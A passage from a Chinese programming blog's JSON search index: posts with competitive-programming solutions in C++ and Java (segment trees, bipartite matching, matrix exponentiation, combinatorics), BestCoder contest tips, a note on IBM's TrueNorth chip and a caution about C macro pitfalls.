CSDN.NET.","link":"/posts/5c49ac30/"},{"title":"混ACGN三年有余，专业分工与细化","text":"进同人圈去创作","link":"/posts/ae789ddf/"},{"title":"【Bestcoder","text":"1001 － Rikka with string Accepts: 395Submissions: 2281Time Limit: 2000/1000 MS (Java/Others)Memory Limit: 65536/65536 K (Java/Others)Problem Description As we know, Rikka is poor at math. Yuta is worrying about this situation, so he gives Rikka some math tasks to practice. There is one of them: One day, Yuta got a string which contains n letters but Rikka lost it in accident. Now they want to recover the string. Yuta remembers that the string only contains lowercase letters and it is not a palindrome string. Unfortunately he cannot remember some letters. Can you help him recover the string? It is too difficult for Rikka. Can you help her?Input This problem has multi test cases (no more than 20). For each test case, The first line contains a number n(1≤n≤1000). The next line contains an n-length string which only contains lowercase letters and ‘?’ – the place which Yuta is not sure.Output For each test cases print a n-length string – the string you come up with. In the case where more than one string exists, print the lexicographically ﬁrst one. In the case where no such string exists, output “QwQ”.Sample Input 5a?bb?3aaa Sample Output aabbaQwQ WA得智商都被拉低了 QAQ[code lang=”cpp”]int dfs(int step,bool &amp;state)//1:to check{ int res; if (step&lt;m-1) res=dfs(step+1,state); int pos=n-vec[step]-1; cout&lt;&lt;step&lt;&lt;’ ‘&lt;&lt;str[vec[step]]&lt;&lt;’ ‘&lt;&lt;str[pos]&lt;&lt;endl; for(char ch=’a’;ch&lt;=’z’;ch++) if (state&amp;&amp;str[pos]==ch) { if (ch&lt;’z’) continue; else return -1;//error } else { str[vec[step]]=ch; if (state&amp;&amp;str[pos]!=’?’&amp;&amp;ch!=str[pos]) state=0; if (ch!=str[pos]) return 1; } return -1;}[/code] AC：[code lang=”cpp”] #include&lt;cctype&gt; #include&lt;cmath&gt; #include&lt;cstdio&gt; #include&lt;cstring&gt; #include&lt;algorithm&gt; #include&lt;iostream&gt; #include&lt;string&gt; #include&lt;queue&gt; #include&lt;stack&gt; #include&lt;set&gt; #include&lt;map&gt; #define CLEAR(a) memset((a),0,sizeof((a))) using namespace std; typedef long long LL;const double pi = acos(-1.0);const int maxn=2e3;const int inf=99999999;const float eps=1e-3; vector&lt;int&gt; vec;int n,m;char s[maxn],str[maxn]; int dfs(int step,bool &amp;state)//1:to check{ int pos=n-vec[step]-1; for(char ch=&apos;a&apos;;ch&amp;lt;=&apos;z&apos;;ch++) { str[vec[step]]=ch; if (str[pos]!=&apos;?&apos;&amp;amp;&amp;amp;ch!=str[pos]) {state=0;} if (step&amp;lt;m-1) dfs(step+1,state); if (state&amp;amp;&amp;amp;str[pos]!=&apos;?&apos;&amp;amp;&amp;amp;ch!=str[pos]||!state) return 1; } return -1; } int main(){ while(~scanf(&amp;quot;%d&amp;quot;,&amp;amp;n)) { vec.clear(); scanf(&amp;quot;%s&amp;quot;,s); memcpy(str,s,sizeof(s)); for(int i=0;i&amp;lt;n;i++) if (s[i]==&apos;?&apos;) vec.push_back(i); m=vec.size(); bool tmp=1; if (m&amp;gt;1||m==1&amp;amp;&amp;amp;!(n%2&amp;amp;&amp;amp;vec[0]==n/2)) { if (dfs(0,tmp)&amp;gt;=0) puts(str); else puts(&amp;quot;QwQ&amp;quot;); } else { bool ans=1; for(int i=1;i&amp;lt;=strlen(s)/2;i++) if (s[i-1]!=s[strlen(s)-i]) { ans=0;break; } if (m==1&amp;amp;&amp;amp;n%2&amp;amp;&amp;amp;vec[0]==n/2) str[vec[0]]=&apos;a&apos;; puts(ans?&amp;quot;QwQ&amp;quot;:str); } } return 0; }[/code]","link":"/posts/8340acf8/"},{"title":"【转】核心网络—BestCoder需要注意的几个问题","text":"核心网络—BestCoder需要注意的几个问题. 1.不能随意hack，hack成功有加分，但是hack失败也会扣分！2.不要随意提交已经AC的题目，罚时是这样的：最后一次AC的之前所有提交（无论AC与否）均算作罚时！其中AC的标为Accepted(Past)，被hack掉的AC也会标为Accepted(Past)。3.AC不代表真正的AC，比赛最后阶段有hack数据，如果被hack掉就不算AC。hack数据一般都是非常变态的输入，或者是大数据！有时候有些人刻意利用题目bug构造变态的数据导致全场无人AC……4.hack时只能读别人的代码，无法复制，这是锻炼读代码的能力。5.如果有一场比赛注册了，但是忘做了，只要没有该场比赛的提交记录就不会使Rating降低。6.只有本场比赛进入前300才能使Rating升高，否则就降低。7.ABCD四道题的难度是依次升高的，分数也是依次升高的，根据错的次数和AC时间而使所得分数不同。8.比赛题目是民间的ACMer出的，如果发现题目中有大量的英语语法错误，请不要见怪。9.比赛日期并非固定在周五或者周六或者周日，根据杭电oj的具体日程安排而定。比如，如果有网络赛，可能就要提前或者延后了。10.最后你的很多AC的题目可能都会被hack掉，请不要见怪。11. 以上错误我几乎都犯过……O__O”…","link":"/posts/7b1a18e6/"},{"title":"POJ 2887 Big String （块状数组） - Geo_2014 - 推酷","text":"POJ 2887 Big String （块状数组） - Geo_2014 - 推酷.","link":"/posts/46dcc717/"},{"title":"POJ 3070 矩阵乘法 模板 - proverbs - 博客园","text":"POJ 3070 矩阵乘法 模板 - proverbs - 博客园.","link":"/posts/3631392/"},{"title":"IT spotlight-TrueNorth by IBM","text":"TrueNorth：IBM的百万神经元类人脑芯片邮票大小、重量只有几克，但却集成了54亿个硅晶体管，内置了4096个内核，100万个“神经元”、2.56亿个“突触”，能力相当于一台超级计算机，功耗却只有65毫瓦。 这就是IBM公布的最新仿人脑芯片：TrueNorth。 为什么要做TrueNorth？ 因为自2008年以来，美国国防部研究机构DARPA给了IBM 5300万美元。TrueNorth是IBM参与DARPA的研究项目SyNapse的最新成果。SyNapse全称是Systems of Neuromorphic Adaptive Plastic Scalable Electronics（自适应可塑可伸缩电子神经系统，而SyNapse正好是突触的意思），其终极目标是开发出打破冯 诺依曼体系的硬件。 为什么要打破冯 诺依曼体系？ 冯 诺依曼体系是传统计算机的基础。这种体系的特点是存放信息和程序指令的内存与处理信息的处理器是分离的。由于处理器是按照线序执行指令的，所以必须不断与内存通过总线反复交换信息—而这个会成为拖慢速度和浪费能量的瓶颈。尽管后来采用了多核芯片和缓存技术，但是这些只能提高速度而不能降低太多能耗，而且没办法实时处理，因为通信是瓶颈—内存和CPU的大量通信要通过总线进行。因此，近几十年来研究人员一直在致力于寻找突破原有体系的技术。 模仿大脑 模仿人类大脑是科学家寻求突破的方向。人类大脑的神经元尽管传导信号的速度很慢，但是却拥有庞大的数量（千亿级），而且每个神经元都通过成千上万个突触与其他神经元相连，形成超级庞大的神经元回路，以分布式和并发式的方式传导信号，相当于超大规模的并行计算，从而弥补了单神经元处理速度的不足。人脑的另一个特点是部分神经元不使用时可以关闭，从而整体能耗很低。","link":"/posts/cf9ba534/"},{"title":"C&#x2F;C++宏定义的不安全性","text":"早就听说#define有不靠谱之处，平时写代码也对它多有抵触情绪；今日偶然一用，大跌眼镜 [code lang=”c”] #define MAX(a,b) (a&gt;b)?a:b[/code] 通常预处理器只对宏定义做相应的字符替换，编译器不做语法检查；visual studio 则能在替换后检查语法。无编译错误，调用的时候无论如何都算不对 [code lang=”c”]return MAX(Depth(T-&gt;lchild), Depth(T-&gt;rchild)) + 1;[/code] 加号的运算优先级如何处理？","link":"/posts/da5207c3/"},{"title":"ACM-ICPC Live Archive Regionals 2014 &gt;&gt; Asia - Kuala Lumpur 6811 - Irrigation Lines","text":"参见：转载前页面 怎么读题时就没发现“每行每列各有一个水阀”？这是把问题转化成二分图模型的关键啊 [code lang=”cpp”] #include &lt;iostream&gt; #include &lt;cstring&gt; #include &lt;cstdio&gt;using namespace std; const int MAXN = 110;char graph[MAXN][MAXN];bool visited[MAXN];int nCase, cCase, use[MAXN], m, n; void init() { memset(use, -1, sizeof(use));} void input() { scanf(&quot;%d%d&quot;, &amp;m, &amp;n); for (int i = 0; i &lt; m; i++) { scanf(&quot;%s&quot;, graph[i]); }} bool find(int x) { for (int j = 0; j &lt; n; j++) { if (graph[x][j] == ‘1’ &amp;&amp; !visited[j]) { visited[j] = true; if (use[j] == -1 || find(use[j])) { use[j] = x; return true; } } } return false; } int match() { int count = 0; for (int i = 0; i &lt; m; i++) { memset(visited, false, sizeof(visited)); if (find(i)) count++; } return count;} void solve() { printf(&quot;Case #%d: %d\\n&quot;, ++cCase, match());} int main() { scanf(&quot;%d&quot;, &amp;nCase); while (nCase–) { init(); input(); solve(); } return 0; }[/code]","link":"/posts/b4a085e6/"},{"title":"2015年浙江省大学生程序设计竞赛","text":"像这样搞错映射关系，不是个很好的情况[code lang=”cpp”] #include&lt;cctype&gt; #include&lt;cmath&gt; #include&lt;cstdio&gt; #include&lt;cstring&gt; #include&lt;algorithm&gt; #include&lt;iostream&gt; #include&lt;string&gt; #include&lt;queue&gt; #include&lt;stack&gt; #include&lt;set&gt; #include&lt;map&gt; #define CLEAR(a) memset((a),0,sizeof((a))) using namespace std; typedef long long LL;const double pi = acos(-1.0);const int maxn=1e4;const int inf=99999999;const double eps=1e-3; int month[13]={0,31,28,31,30,31,30,31,31,30,31,30,31}; int ans(int x){ // cout&lt;&lt;x&lt;&lt;endl ; if (x==-1) return 6; if (x==0) return 5; if (x==1) return 6; if (x==2) return 9; if (x==3) return 6; if (x==4) return 5; if (x==5) return 5; if (x==6) return 5; if (x==7) return 5; if (x==8) return 6;} int isleap(int y){ if ((y%4==0&amp;&amp;y%100!=0) || y%400==0) return 366; else return 365;} int fun(int y,int m){ if (m==2) { if ((y%4==0&amp;&amp;y%100!=0) || y%400==0) return 29; else return 28; } else return month[m];} int main(){ int T; scanf(&quot;%d&quot;,&amp;T); while(T–) { int y; scanf(&quot;%d&quot;,&amp;y); int day=0; for(int i=1928;i&lt;y;i++) day+=isleap(i); for(int i=1;i&lt;=4;i++) day+=fun(y,i); day+=1; //cout&lt;&lt;day&lt;&lt;’ ‘; cout&lt;&lt;ans(day%7)&lt;&lt;endl; /*switch (day%7) { case 0: }*/ } return 0; }[/code]","link":"/posts/4eca73a3/"},{"title":"看起来比较舒服的矩阵乘法模板","text":"转载源页面poj 3070[code lang=”cpp”] #include &lt;iostream&gt; #include &lt;cstring&gt; #include &lt;cstdlib&gt; #include &lt;cstdio&gt; #define SIZE 4 #define mod 10000 using namespace std; struct MATRIX{ int mt[SIZE][SIZE]; int x,y;}ans,def; int n; inline MATRIX operator (MATRIX a,MATRIX b){ MATRIX c; memset(c.mt,0,sizeof c.mt); c.x=a.x; c.y=b.y; for(int i=1;i&lt;=a.x;i++) for(int j=1;j&lt;=b.y;j++) for(int k=1;k&lt;=a.y;k++) c.mt[i][j]=(c.mt[i][j]+(a.mt[i][k]%mod)(b.mt[k][j]%mod))%mod; return c;} inline MATRIX operator +(MATRIX a,MATRIX b){ MATRIX c; memset(c.mt,0,sizeof c.mt); c.x=a.x; c.y=a.y; for(int i=1;i&lt;=c.x;i++) for(int j=1;j&lt;=c.y;j++) c.mt[i][j]=(a.mt[i][j]+b.mt[i][j])%mod; return c;} inline bool prt(MATRIX &amp;c){ for(int i=1;i&lt;=c.x;i++) { for(int j=1;j&lt;=c.y;j++) printf(&quot;%d &quot;,c.mt[i][j]); puts(&quot;&quot;); }} void go(){ n-=2; def.mt[1][1]=def.mt[1][2]=def.mt[2][1]=1; def.mt[2][2]=0; def.x=def.y=2; ans.mt[1][1]=ans.mt[1][2]=ans.mt[2][1]=1; ans.mt[2][2]=0; ans.x=ans.y=2; while(n) { if(n&amp;amp;1) ans=ans*def; def=def*def; n&amp;gt;&amp;gt;=1; } printf(&amp;quot;%d\\n&amp;quot;,ans.mt[1][1]); } int main(){ while(scanf(&quot;%d&quot;,&amp;n)) { if(n==-1) break; else if(n==0) puts(&quot;0&quot;); else if(n==1) puts(&quot;1&quot;); else go(); } system(&quot;pause&quot;); return 0;}[/code]","link":"/posts/c8084c88/"},{"title":"ACM - ICPC Regionals 2014 Bangkok 亚洲区域赛 国外某数学题","text":"ACM-ICPC Live Archive Regionals 2014 &gt;&gt; Asia - Bangkok 6844 - Combination 原题页面PDF题面Vjudge提交地址 艰辛坎坷的探索历程 设$latex {f(n)=C_{n}^{r}(n∈N^{ * },r∈[0,n])} $中奇数的个数。题意是说，求出$latex \\sum f(k),k∈[low,high] $庞大的数据，$latex n≤16\\times{10^{11}}. $ step1 判断给定$latex n∈N^{ * } $时$latex C_n^r(r∈[0,n]) $的奇偶性。 不难往n,r的二进制表示方向考虑。查阅他人博客获得结论：$latex n{ \\&amp; }r==r $时$latex C_n^r $为奇数。 然而本题中无需直接应用这一“定理”，所要做的是统计。拿出纸笔推算发现，若n的二进制表示中有d个1，则$latex C_n^r(r∈[0,n]) $中存在$latex 2^d $个奇数。 step2 研究 $latex f(n) $ 的递推关系及通项。 编写暴力程序 $latex O(n^2) $ ，打表观察 $latex n∈[0,64) $ 时 $latex f(n) $ 的取值： 1 2 2 4 2 4 4 8 2 4 4 8 4 8 8 16 2 4 4 8 4 8 8 16 4 8 8 16 8 16 16 32 2 4 4 8 4 8 8 16 4 8 8 16 8 16 16 32 4 8 8 16 8 16 16 32 8 16 16 32 16 32 32 64第一行 $latex f(0)=1 $ 作为边界条件， 第二行 $latex f(1)=2 $ ，随后各行的第k行的 $latex 2^{k-2} $ 个数分别表示 $latex f(2^{k-2}),f(2^{k-2}+1),…,f(2^{k-1}-1) $ 。通过不懈的努力，观察发现从第3行开始，每行的前半部分与前一行完全一致，每行的后半部分的各个f值恰为前半部分对应位置的f值的2倍。 step3出于数列直觉，我们尝试求解各行的和构成的数列的递推以及通项。$ a_1=1 $$ a_2=2 $$ a_3=a_2+2\\times{a_2}=3\\times{a_2}=6 $…$ a_n=a_{n-1}+2\\times{a_{n-1}}=3\\times{a_{n-1}}(n\\geq 3) $（递推公式）通项公式:$$\\begin{equation} a_n= \\begin{cases} 1 &amp;\\mbox{$n=1$}\\newline 2 &amp;\\mbox{$n=2$}\\newline 2\\times3^{n-2} &amp;\\mbox{$n\\geq 3$} \\end{cases} \\end{equation}$$ $$\\begin{equation} S_n=\\sum\\limits_{i=1}^{n} {a_i}= \\begin{cases} 1 &amp;\\mbox{$n=1$}\\newline 3 &amp;\\mbox{$n=2$}\\newline 3+6\\times\\frac{1-3^{n-2}}{1-3}=3+3\\times{(3^{n-2}-1)}=3^{n-1} &amp;\\mbox{$n\\geq 3$} \\end{cases} \\end{equation}$$ $$S_n=3^{n-1}（a_n的前n项和的公式）$$化简后上面这个公式样子够好看了吧？ step4再看一下第2步发现的规律，应用“二分”手段高效地求解，而且真的可以二分求解。具体地说，就是先置求解区间 $latex [l,r) $ (左闭右开)的端点于每行的头尾( $latex l=2^{i-2},r=2^{i-1} $ )，利用上一步所得公式计算该区间的 $latex 左端点前缀和U=\\sum\\limits_{k=1}^{2^{i-2}} {f(k)} $ 与 $latex 右端点前缀和V=\\sum\\limits_{k=1}^{2^{i-1}-1} {f(k)} $ 后，不断地对区间折半，总可以确定新区间的左端点前缀和与右端点前缀和。当区间缩至一点时，$latex U==V==f(k) $，即能得到我们所求，而无需计算出[1..n]的每个函数值。 step5以上所解决的并不是最终答案，而是前缀和 $latex \\sum\\limits_{k=1}^{n} {f(k)} $ ；不过走到这一步已经很好办了，$latex ans=\\sum\\limits_{k=low}^{high} {f(k)}=\\sum\\limits_{k=1}^{high} {f(k)}-\\sum\\limits_{k=1}^{low-1} {f(k)} $ PS:写完代码后，用极大的n值测试一下，事实上$latex \\sum\\limits_{k=1}^{n} {f(k)} $已经超出了int64的范围。其他的细节不必多说了。 1.319s AC java代码：[code lang=”cpp”]/** @date 2015-05-31 @author Semprathlon/import java.math.;import java.io.*; public class Main { static int maxn=42; static BigInteger[] sum=new BigInteger[maxn]; static long[] Pow2=new long[maxn]; final static BigInteger TWO=BigInteger.valueOf(2); final static BigInteger THREE=BigInteger.valueOf(3); static int found_pow2(long n){ return (int)(Math.log((double)n)/Math.log(2.0)); } static void init(){ for(int i=0;i&amp;lt;maxn;i++) { sum[i]=THREE.pow(i); Pow2[i]=1L&amp;lt;&amp;lt;i; } } static BigInteger Bisearch(long l,long r,BigInteger ls,BigInteger rs,long key){ while(l+1L&amp;lt;r){ long mid=(l+r)&amp;gt;&amp;gt;1; if(key&amp;lt;mid){ r=mid; rs=ls.add(rs.subtract(ls).divide(THREE)); } else{ l=mid; ls=ls.add(rs.subtract(ls).divide(THREE)); } } return ls; } static BigInteger solve(long n){ if (n&amp;lt;0L) return BigInteger.ZERO; if (n==0L) return BigInteger.ONE; int k=found_pow2(n+1); BigInteger ls=sum[k]; BigInteger rs=sum[k+1]; return Bisearch(Pow2[k],Pow2[k+1],ls,rs,n+1); } public static void main(String[] args) throws IOException{ init(); StreamTokenizer in = new StreamTokenizer(new BufferedReader(new InputStreamReader(System.in))); PrintWriter out = new PrintWriter(new OutputStreamWriter(System.out)); long n=0,m=0; while(in.nextToken() != StreamTokenizer.TT_EOF){ n=(long)in.nval; in.nextToken(); m=(long)in.nval; if (n==0L&amp;amp;&amp;amp;m==0L) break; out.println(solve(m).subtract(solve(n-1))); } out.flush(); out.close(); } }[/code] 0.279s AC cpp代码：[code lang=”cpp”] #include&lt;cmath&gt; #include&lt;cstdio&gt; #include&lt;cstring&gt; #include&lt;iostream&gt; using namespace std; typedef long long LL;typedef unsigned long long ULL;const int maxn = 42;const LL mod = 1e8;const int digit = 8;struct LongInt{ LL data[3]; LongInt() { data[0] = data[1] = data[2] = 0; } LongInt(LL n) { data[0] = n % mod; n /= mod; data[1] = n % mod; n /= mod; data[2] = n; } LongInt operator= (const LL num) { LL n = num; data[0] = n % mod; n /= mod; data[1] = n % mod; n /= mod; data[2] = n; return this; } LongInt operator+ (const LL&amp; num) { LL n = num; LongInt tmp = this; tmp.data[0] += n; tmp.data[1] += tmp.data[0] / mod; tmp.data[0] %= mod; tmp.data[2] += tmp.data[1] / mod; tmp.data[1] %= mod; return tmp; } LongInt operator+ (const LongInt&amp; b) { LongInt tmp = this; tmp.data[0] += b.data[0]; tmp.data[1] += b.data[1]; tmp.data[2] += b.data[2]; tmp.data[1] += tmp.data[0] / mod; tmp.data[0] %= mod; tmp.data[2] += tmp.data[1] / mod; tmp.data[1] %= mod; return tmp; } LongInt operator- (const LongInt&amp; b) { LongInt tmp = this; tmp.data[0] -= b.data[0]; if (tmp.data[0] &lt; 0) { tmp.data[1]–; tmp.data[0] += mod; } tmp.data[1] -= b.data[1]; if (tmp.data[1] &lt; 0) { tmp.data[2]–; tmp.data[1] += mod; } tmp.data[2] -= b.data[2]; return tmp; } LongInt operator (const LL num) { LL n = num; LongInt tmp = this; tmp.data[0] = num; tmp.data[1] = num; tmp.data[2] = num; tmp.data[1] += tmp.data[0] / mod; tmp.data[0] %= mod; tmp.data[2] += tmp.data[1] / mod; tmp.data[1] %= mod; return tmp; } LongInt operator= (const LL num) { this = this num; return this; } LongInt operator/ (const LL num) { LongInt tmp = this; tmp.data[1] += tmp.data[2] % num mod; tmp.data[2] /= num; tmp.data[0] += tmp.data[1] % num mod; tmp.data[1] /= num; tmp.data[0] /= num; return tmp; } void fillzero(int n) { char str[digit 2]; sprintf(str, &quot;%d&quot;, n); for (int i = 1; i &lt;= digit - strlen(str); i++) { printf(&quot;%d&quot;, 0); } printf(&quot;%s&quot;, str); } void print() { if (data[2] &gt; 0) { printf(&quot;%d&quot;, data[2]); fillzero(data[1]); fillzero(data[0]); } else if (data[1] &gt; 0) { printf(&quot;%d&quot;, data[1]); fillzero(data[0]); } else { printf(&quot;%d&quot;, data[0]); } }}; const LL pow2[maxn] = {1, 2, 4, 8, 16, 32, 64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65536, 131072, 262144, 524288, 1048576, 2097152, 4194304, 8388608, 16777216, 33554432, 67108864, 134217728, 268435456, 536870912, 1073741824, 2147483648, 4294967296, 8589934592, 17179869184, 34359738368, 68719476736, 137438953472, 274877906944, 549755813888, 1099511627776, 2199023255552 };/const ULL sum[maxn] = {3, 5, 11, 29, 83, 245, 731, 2189, 6563, 19685, 59051, 177149, 531443, 1594325, 4782971, 14348909, 43046723, 129140165, 387420491, 1162261469, 3486784403, 10460353205, 31381059611, 94143178829, 282429536483, 847288609445, 2541865828331, 7625597484989, 22876792454963, 68630377364885, 205891132094651, 617673396283949, 1853020188851843, 5559060566555525, 16677181699666571, 50031545098999709, 150094635296999123, 450283905890997365, 1350851717672992091, 4052555153018976269, 12157665459056928803 };/LongInt sum[maxn]; int found_pow2(ULL n){ return int(log(n) / log(2));} LongInt Bisearch(LL l, LL r, LongInt ls, LongInt rs, LL key) // [ l , r ){ while (l + 1 &lt; r) { ULL mid = (l + r) &gt;&gt; 1; if (key &lt; mid) { r = mid; rs = (rs - ls) / 3 + ls; } else { l = mid; ls = (rs - ls) / 3 + ls; } } return ls;} LongInt solve(LL n){ if (n &lt; 0) { return 0; } if (!n) { return 1; } int k = found_pow2(n + 1); LongInt ls = sum[k]; LongInt rs = sum[k + 1]; return Bisearch(pow2[k], pow2[k + 1], ls, rs, n + 1);} void init(){ LongInt tmp = 1; for (int i = 0; i &lt; maxn; i++) { sum[i] = tmp; tmp *= 3; }} int main(){ init(); LL n, m; while (cin &gt;&gt; n &gt;&gt; m) { if (!n &amp;&amp; !m) { break; } LongInt ans = solve(m) - solve(n - 1); ans.print(); puts(&quot;&quot;); } return 0;}[/code]","link":"/posts/22611353/"},{"title":"2014 Beijing Regional","text":"","link":"/posts/a97f9d5e/"},{"title":"2014 Beijing Regional","text":"","link":"/posts/a97f9d5e/"},{"title":"2013ACM-ICPC杭州赛区全国邀请赛","text":"Transformation（HDU 4578） Time Limit: 15000/8000 MS (Java/Others) Memory Limit: 65535/65536 K (Java/Others) Problem DescriptionYuanfang is puzzled with the question below:There are n integers, a1, a2, …, an. The initial values of them are 0. There are four kinds of operations.Operation 1: Add c to each number between ax and ay inclusive. In other words, do transformation ak&lt;—ak+c, k = x,x+1,…,y.Operation 2: Multiply c to each number between ax and ay inclusive. In other words, do transformation ak&lt;—ak×c, k = x,x+1,…,y.Operation 3: Change the numbers between ax and ay to c, inclusive. In other words, do transformation ak&lt;—c, k = x,x+1,…,y.Operation 4: Get the sum of p power among the numbers between ax and ay inclusive. In other words, get the result of axp+ax+1p+…+ay p.Yuanfang has no idea of how to do it. So he wants to ask you to help him. InputThere are no more than 10 test cases.For each case, the first line contains two numbers n and m, meaning that there are n integers and m operations. 1 &lt;= n, m &lt;= 100,000.Each the following m lines contains an operation. Operation 1 to 3 is in this format: “1 x y c” or “2 x y c” or “3 x y c”. Operation 4 is in this format: “4 x y p”. (1 &lt;= x &lt;= y &lt;= n, 1 &lt;= c &lt;= 10,000, 1 &lt;= p &lt;= 3)The input ends with 0 0. OutputFor each operation 4, output a single integer in one line representing the result. The answer may be quite large. You just need to calculate the remainder of the answer when divided by 10007. Sample Input5 53 3 5 71 2 4 44 1 5 22 2 5 84 3 5 30 0 Sample Output3077489 TLE，不必在每次query时都更新到叶结点[code lang=”cpp”]struct Node{ int l,r,mid; LL v,add,mul;} SegTree[maxn*4]; void build(int rt,int l,int r){ SegTree[rt].l=l;SegTree[rt].r=r; SegTree[rt].mid=(l+r)&gt;&gt;1; SegTree[rt].add=SegTree[rt].v=0; SegTree[rt].mul=1; if (l&lt;r) { build(rt&lt;&lt;1,l,SegTree[rt].mid); build(rt&lt;&lt;1|1,SegTree[rt].mid+1,r); }} void add(int rt,int x,int y,int num){ int &amp;l=SegTree[rt].l,&amp;r=SegTree[rt].r,&amp;mid=SegTree[rt].mid; if (x&gt;y) return; //cout&lt;&lt;&quot;+ &quot;&lt;&lt;rt&lt;&lt;’ ‘&lt;&lt;l&lt;&lt;’ ‘&lt;&lt;r&lt;&lt;’ ‘&lt;&lt;mid&lt;&lt;&quot; &quot;&lt;&lt;x&lt;&lt;’ ‘&lt;&lt;y&lt;&lt;’ ‘&lt;&lt;num&lt;&lt;endl; if (x&lt;=SegTree[rt].l&amp;&amp;SegTree[rt].r&lt;=y) { SegTree[rt].add+=num; SegTree[rt].add%=mod; return; } int tmp=SegTree[rt].add; if (SegTree[rt].add) { SegTree[rt].add=0; add(rt,SegTree[rt].l,x-1,tmp); add(rt,y+1,SegTree[rt].r,tmp); } if (x&amp;lt;=mid) add(rt&amp;lt;&amp;lt;1,x,min(mid,y),tmp+num); if (y&amp;gt;mid) add(rt&amp;lt;&amp;lt;1|1,max(mid+1,x),y,tmp+num); } void mul(int rt,int x,int y,int num){ int &amp;l=SegTree[rt].l,&amp;r=SegTree[rt].r,&amp;mid=SegTree[rt].mid; if (x&gt;y) return; if (x&lt;=SegTree[rt].l&amp;&amp;SegTree[rt].r&lt;=y) { SegTree[rt].mul=num;SegTree[rt].mul%=mod; SegTree[rt].add=num;SegTree[rt].add%=mod; return; } int tmp=SegTree[rt].mul; if (SegTree[rt].mul!=1) { SegTree[rt].mul=1; add(rt,SegTree[rt].l,x-1,SegTree[rt].addtmp); mul(rt,SegTree[rt].l,x-1,tmp); add(rt,x,y,SegTree[rt].addtmpnum); add(rt,y+1,SegTree[rt].r,SegTree[rt].addtmp); mul(rt,y+1,SegTree[rt].r,tmp); } if (x&lt;=mid) mul(rt&lt;&lt;1,x,min(mid,y),tmpnum); if (y&gt;mid) mul(rt&lt;&lt;1|1,max(mid+1,x),y,tmpnum);} void cover(int rt,int x,int y,int num){ int &amp;l=SegTree[rt].l,&amp;r=SegTree[rt].r,&amp;mid=SegTree[rt].mid; if (x&gt;y) return; //cout&lt;&lt;&quot;c &quot;&lt;&lt;rt&lt;&lt;’ ‘&lt;&lt;l&lt;&lt;’ ‘&lt;&lt;r&lt;&lt;’ ‘&lt;&lt;mid&lt;&lt;&quot; &quot;&lt;&lt;x&lt;&lt;’ ‘&lt;&lt;y&lt;&lt;’ ‘&lt;&lt;num&lt;&lt;endl; if (x&lt;=SegTree[rt].l&amp;&amp;SegTree[rt].r&lt;=y) { SegTree[rt].v=num; SegTree[rt].add=0; SegTree[rt].mul=1; return; } if (SegTree[rt].add) { int tmp=SegTree[rt].add; SegTree[rt].add=0; add(rt,SegTree[rt].l,x-1,tmp); add(rt,y+1,SegTree[rt].r,tmp); } if (SegTree[rt].mul!=1) { int tmp=SegTree[rt].mul; SegTree[rt].mul=1; mul(rt,SegTree[rt].l,x-1,tmp); mul(rt,y+1,SegTree[rt].r,tmp); } if (x&lt;=mid) cover(rt&lt;&lt;1,x,min(mid,y),num); if (y&gt;mid) cover(rt&lt;&lt;1|1,max(mid+1,x),y,num);} LL query(int rt,int x,int y,int p){ int &amp;l=SegTree[rt].l,&amp;r=SegTree[rt].r,&amp;mid=SegTree[rt].mid; //cout&lt;&lt;&quot;q &quot;&lt;&lt;rt&lt;&lt;’ ‘&lt;&lt;l&lt;&lt;’ ‘&lt;&lt;r&lt;&lt;’ ‘&lt;&lt;mid&lt;&lt;&quot; &quot;&lt;&lt;SegTree[rt].v&lt;&lt;’ ‘&lt;&lt;SegTree[rt].add&lt;&lt;’ ‘&lt;&lt;SegTree[rt].mul&lt;&lt;endl; //&lt;&lt;&quot; &quot;&lt;&lt;x&lt;&lt;’ ‘&lt;&lt;y&lt;&lt;’ ‘&lt;&lt;endl; if (SegTree[rt].l==SegTree[rt].r) //if (SegTree[rt].v) { SegTree[rt].v=SegTree[rt].mul;SegTree[rt].v%=mod; SegTree[rt].v+=SegTree[rt].add;SegTree[rt].v%=mod; SegTree[rt].add=0; SegTree[rt].mul=1; switch(p) { case 1:return SegTree[rt].v; case 2:return SegTree[rt].vSegTree[rt].v%mod; case 3:return SegTree[rt].vSegTree[rt].vSegTree[rt].v%mod; } } if (SegTree[rt].v) { add(rt&amp;lt;&amp;lt;1,l,mid,SegTree[rt].v*SegTree[rt].mul+SegTree[rt].add); add(rt&amp;lt;&amp;lt;1|1,mid+1,r,SegTree[rt].v*SegTree[rt].mul+SegTree[rt].add); SegTree[rt].v=0; } if (SegTree[rt].add) { //puts(&amp;quot;update&amp;quot;); add(rt&amp;lt;&amp;lt;1,l,mid,SegTree[rt].add); add(rt&amp;lt;&amp;lt;1|1,mid+1,r,SegTree[rt].add); SegTree[rt].add=0; } if (SegTree[rt].mul!=1) { mul(rt&amp;lt;&amp;lt;1,l,mid,SegTree[rt].mul); mul(rt&amp;lt;&amp;lt;1|1,mid+1,r,SegTree[rt].mul); SegTree[rt].mul=1; } return (((x&amp;lt;=mid)?query(rt&amp;lt;&amp;lt;1,x,min(mid,y),p):0)+((y&amp;gt;mid)?query(rt&amp;lt;&amp;lt;1|1,max(mid+1,x),y,p):0))%mod; } LL fnd(int rt,int x){ if(SegTree[rt].l==SegTree[rt].r) return SegTree[rt].v; else if (x&lt;=SegTree[rt].mid) return fnd(rt&lt;&lt;1,x); else return fnd(rt&lt;&lt;1|1,x);} int main(){ int n,m; while(~scanf(&quot;%d%d&quot;,&amp;n,&amp;m)) { if (!n&amp;&amp;!m) break; build(1,1,n); for(int i=1;i&lt;=m;i++) { int op,x,y,c; scanf(&quot;%d%d%d%d&quot;,&amp;op,&amp;x,&amp;y,&amp;c); switch(op) { case 1: add(1,x,y,c);//query(1,x,y,1); break; case 2: mul(1,x,y,c);//query(1,x,y,1); break; case 3: cover(1,x,y,c);//query(1,x,y,1); break; case 4: printf(&quot;%I64d\\n&quot;,query(1,x,y,c)); break; } //for(int i=1;i&lt;=n;i++) printf(&quot;%lld &quot;,fnd(1,i));printf(&quot;\\n&quot;); } } return 0;}[/code] AC 4882MS[code lang=”cpp”]#include&lt;cctype&gt;#include&lt;cmath&gt;#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;queue&gt;#include&lt;stack&gt;#include&lt;set&gt;#include&lt;map&gt;#define CLEAR(a) memset((a),0,sizeof((a))) using namespace std; typedef long long LL;const double pi = acos(-1.0);const int maxn = 1e5 + 10;const int inf = 99999999;const double eps = 1e-3;const int mod = 10007; struct Node{ int l, r, 